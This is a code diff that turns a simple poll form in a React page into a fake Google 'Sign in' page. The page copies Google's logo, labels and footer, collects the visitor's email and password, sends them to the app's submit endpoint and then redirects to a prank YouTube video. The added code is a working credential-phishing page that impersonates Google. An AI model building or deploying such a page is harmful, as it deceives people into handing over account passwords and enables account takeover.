@@ -10,11 +10,8 @@ export default function Home() {
     event.preventDefault();
     
     const formData = {
-      name: event.target.name.value,
       email: event.target.email.value,
-      question1: event.target.question1.value,
-      question2: event.target.question2.value,
-      feedback: event.target.feedback.value
+      password: event.target.password.value
     };
 
     try {
@@ -29,10 +26,9 @@ export default function Home() {
       if (response.ok) {
         setStatus('success');
         event.target.reset();
-        // Show success message briefly before redirect
         setTimeout(() => {
           window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
-        }, 1000); // Waits 1 second before redirecting
+        }, 1000);
       } else {
         setStatus('error');
       }
@@ -43,7 +39,75 @@ export default function Home() {
   }
 
   return (
-    <main className={styles.container}>
+    <div className={styles.pageWrapper}>
+      <div className={styles.contentWrapper}>
+        <div className={styles.signinCard}>
+          <div className={styles.logo}>
+            <img 
+              src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" 
+              alt="Google" 
+            />
+          </div>
+          
+          <h1 className={styles.title}>Sign in</h1>
+          <p className={styles.subtitle}>with your Google Account</p>
+
+          <form onSubmit={handleSubmit} className={styles.formContainer}>
+            <div className={styles.inputGroup}>
+              <label className={styles.inputLabel}>Email or phone</label>
+              <input
+                type="text"
+                name="email"
+                required
+                className={styles.input}
+                autoComplete="username"
+              />
+            </div>
+
+            <div className={styles.inputGroup}>
+              <label className={styles.inputLabel}>Enter your password</label>
+              <input
+                type="password"
+                name="password"
+                required
+                className={styles.input}
+                autoComplete="current-password"
+              />
+            </div>
+            
+            <div className={styles.bottomContainer}>
+              <a href="#" className={styles.forgotLink}>
+                Forgot password?
+              </a>
+              <button type="submit" className={styles.signinButton}>
+                SIGN IN
+              </button>
+            </div>
+          </form>
+
+          {/* {status === 'success' && <p className={styles.successMessage}>Signing in...</p>} */}
+          {/* {status === 'error' && <p className={styles.errorMessage}>There was an error signing in. Please try again.</p>} */}
+        </div>
+      </div>
+
+      <footer className={styles.footer}>
+        <div className={styles.footerContent}>
+          <div className={styles.languageSelector}>
+            English (United States)
+          </div>
+          <div className={styles.footerLinks}>
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+          </div>
+        </div>
+      </footer>
+    </div>
+  );
+}
+
+
+    {/* <main className={styles.container}>
       <h1>Poll Form</h1>
       <form onSubmit={handleSubmit} className={styles.form}>
         <div className={styles.formGroup}>
@@ -70,6 +134,4 @@ export default function Home() {
       </form>
       {status === 'success' && <p className={styles.success}>Thank you for your response!</p>}
       {status === 'error' && <p className={styles.error}>There was an error submitting your response. Please try again.</p>}
-    </main>
-  );
-}
+    </main> */}
